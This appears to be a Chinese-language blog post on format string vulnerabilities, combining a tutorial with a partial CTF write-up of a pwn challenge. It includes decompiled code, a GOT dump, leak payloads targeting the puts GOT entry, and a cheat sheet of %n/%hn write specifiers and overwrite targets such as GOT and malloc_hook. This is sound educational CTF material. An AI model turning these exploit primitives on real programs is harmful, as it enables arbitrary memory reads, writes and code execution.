---
title: 格式化字符串漏洞
date: 2017-08-07 20:38:44
tags:
- pwn
- 格式化字符串
categories:
- [security,pwn]
---

格式化漏洞的原理
printf函数在处理参数的时候，每遇到一个%开头的标记，就会根据这个%开头的字符所规定的规则执行，即使没有传入参数，也会认定栈上相应的位置为参数。
每一个格式化字符串的 % 之后可以跟一个十进制的常数再跟一个 $ 符号, 表示格式化指定位置的参数

<!-- more -->

开始入坑格式化字符串漏洞利用！



## 格式化字符串利用目的
- 读任意一块内存区域
- 写任意一块内存区域

## 访问任意位置内存

格式字符串位于栈上. 如果我们可以把目标地址编码进格式字符串，那样目标地址也会存在于栈上，在接下来的例子里，格式字符串将保存在栈上的缓冲区中。


最大的挑战就是想方设法找出 printf 函数栈指针(函数取参地址)到 user_input 数组的这一段距离是多少，这段距离决定了你需要在%s 之前输入多少个%x。

## 在内存中写一个数字

%n: 该符号前输入的字符数量会被存储到对应的参数中去。*格式化字符串输出几个字符，%n就是几，比如printf("%d%n", 1234, &n)；此时n就是4.*
利用这个方法，攻击者可以做以下事情:
1. 重写程序标识控制访问权限
2. 重写栈或者函数等等的返回地址
然而，写入的值是由%n 之前的字符数量决定的。真的有办法能够写入任意数值么？
1. 用最古老的计数方式， 为了写 1000，就填充 1000 个字符吧。
2. 为了防止过长的格式字符串，我们可以使用一个宽度指定的格式指示器。(比如（%0 数字 x）就会左填充预期数量的 0 符号)


目前做这个[格式化字符串题目](https://github.com/CTF-Thanos/ctf-writeups/tree/master/2016/CCTF/pwn/pwn3)。也可以在这里下载[file](/img/format-strings/pwn3)和[libc.so](/img/format-strings/libc.so.6)。
拿到之后先运行程序，是个简单的ftp server，开始需要输入用户名和密码。
用IDA Pro查看反汇编代码，从main函数开始。


```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // eax@2
  int v4; // [sp+14h] [bp-2Ch]@1
  signed int v5; // [sp+3Ch] [bp-4h]@2

  setbuf(stdout, 0);
  ask_username((char *)&v4);
  ask_password((char *)&v4);
  while ( 1 )
  {
    while ( 1 )
    {
      print_prompt();
      v3 = get_command();
      v5 = v3;
      if ( v3 != 2 )
        break;
      put_file();
    }
    if ( v3 == 3 )
    {
      show_dir();
    }
    else
    {
      if ( v3 != 1 )
        exit(1);
      get_file();
    }
  }
}
```

其中`ask_username`函数
```
char *__cdecl ask_username(char *dest)
{
  char src[40]; // [sp+14h] [bp-34h]@1
  int i; // [sp+3Ch] [bp-Ch]@1

  puts("Connected to ftp.hacker.server");
  puts("220 Serv-U FTP Server v6.4 for WinSock ready...");
  printf("Name (ftp.hacker.server:Rainism):");
  __isoc99_scanf("%40s", src);
  for ( i = 0; i <= 39 && src[i]; ++i )
    ++src[i];
  return strcpy(dest, src);
}
```
`ask_password`函数为
```
int __cdecl ask_password(char *s1)
{
  if ( strcmp(s1, "sysbdmin") )
  {
    puts("who you are?");
    exit(1);
  }
  return puts("welcome!");
}
```
两者结合不难发现，server密码是sysbdmin，用户名采用采用凯撒加密，反推可得到用户名。




```c
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) ) 
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 40);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```


```c
char *put_file()
{
  char *v0; // ST1C_4@1
  char *result; // eax@1

  v0 = (char *)malloc(244u);
  printf("please enter the name of the file you want to upload:");
  get_input((int)v0, 40, 1);
  printf("then, enter the content:");
  get_input((int)(v0 + 40), 200, 1);
  *((_DWORD *)v0 + 60) = file_head;
  result = v0;
  file_head = (int)v0;
  return result;
}
```

```c
int show_dir()
{
  int v0; // eax@3
  char s[1024]; // [sp+14h] [bp-414h]@1
  int i; // [sp+414h] [bp-14h]@1
  int j; // [sp+418h] [bp-10h]@1
  int v5; // [sp+41Ch] [bp-Ch]@1

  v5 = 0;
  j = 0;
  bzero(s, 0x400u);
  for ( i = file_head; i; i = *(_DWORD *)(i + 240) )
  {
    for ( j = 0; *(_BYTE *)(i + j); ++j )
    {
      v0 = v5++;
      s[v0] = *(_BYTE *)(i + j);
    }
  }
  return puts(s);
}
```



拿到puts的GOT地址，`0x0804a028`。
```
➜  fmt_string_write_got objdump -R pwn3 

pwn3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a060 R_386_COPY        stdin
0804a080 R_386_COPY        stdout
0804a00c R_386_JUMP_SLOT   setbuf
0804a010 R_386_JUMP_SLOT   strcmp
0804a014 R_386_JUMP_SLOT   printf
0804a018 R_386_JUMP_SLOT   bzero
0804a01c R_386_JUMP_SLOT   fread
0804a020 R_386_JUMP_SLOT   strcpy
0804a024 R_386_JUMP_SLOT   malloc
0804a028 R_386_JUMP_SLOT   puts

```
leak出puts函数的动态加载地址。
```
0x804A028=134520872
\x28\xa0\x04\x08%7$s
%8$s\x28\xa0\x04\x08
```


# 知识点


- 格式化漏洞的使用技术

	1. %N$p：以16进制的格式输出位于printf第N个参数位置的值；
	2. %N$s：以printf第N个参数位置的值为地址，输出这个地址指向的字符串的内容；
	3. %N$n：以printf第N个参数位置的值为地址，将输出过的字符数量的值写入这个地址中，对于32位elf而言，%n是写入4个字节，%hn是写入2个字节，%hhn是写入一个字节；
	4. %Nc：输出N个字符，这个可以配合%N$n使用，达到任意地址任意值写入的目的。

- 格式化串参数：

	转换格式符：d、i、o、u、x用于整数，e、f、g、a用于浮点数，c用于字符，特别留意下面两个：

	1、可用%s从目标进程读取内存数据；

	2、可用%n把输出字符串长度写入任意地址；

	3、可用宽度修饰符修改输出的字符的数量；

	4、可用%hn修饰符每次写入16位数值。

- 格式化字符串参数的姿势
	32位

	读

	'%{}$x'.format(index)           // 读4个字节
	'%{}$p'.format(index)           // 同上面
	'${}$s'.format(index)
	写

	'%{}$n'.format(index)           // 解引用，写入四个字节
	'%{}$hn'.format(index)          // 解引用，写入两个字节
	'%{}$hhn'.format(index)         // 解引用，写入一个字节
	'%{}$lln'.format(index)         // 解引用，写入八个字节
	64位

	读

	'%{}$x'.format(index, num)      // 读4个字节
	'%{}$lx'.format(index, num)     // 读8个字节
	'%{}$p'.format(index)           // 读8个字节
	'${}$s'.format(index)
	写

	'%{}$n'.format(index)           // 解引用，写入四个字节
	'%{}$hn'.format(index)          // 解引用，写入两个字节
	'%{}$hhn'.format(index)         // 解引用，写入一个字节
	'%{}$lln'.format(index)         // 解引用，写入八个字节
	%1$lx: RSI
	%2$lx: RDX
	%3$lx: RCX
	%4$lx: R8
	%5$lx: R9
	%6$lx: 栈上的第一个QWORD

- 格式化字符串可以覆盖的地址

	1、保存的返回地址（栈溢出，用信息泄露的方法来确定返回地址的位置）；

	2、全局偏移表（GOT），动态重定位对函数；

	3、析构函数表（DTORS）；

	4、C函数库钩子，例如malloc_hook、realloc_hook和free_hook；

	5、atexit结构；

	6、所有其他的函数指针，例如C++ vtables、回调函数等；

	7、Windows里默认未处理的异常处理程序，它几乎总是在同一地址。



- 0x00 输出利用0x100溢出

- \x10\x01\x48\x08 是目标地址的四个字节， 在 C 语言中, \x10 告诉编译器将一个 16 进制数 0x10 放于当前位置（占 1 字节）。如果去掉前缀\x10 就相当于两个 ascii 字符 1 和 0 了，这就不是我们所期望的结果了。

- 注意,使用gdb调试时,每次看到的栈地址可能是不变的,这并不代表系统没有打开ASLR,gdb调试时会自动关闭ASLR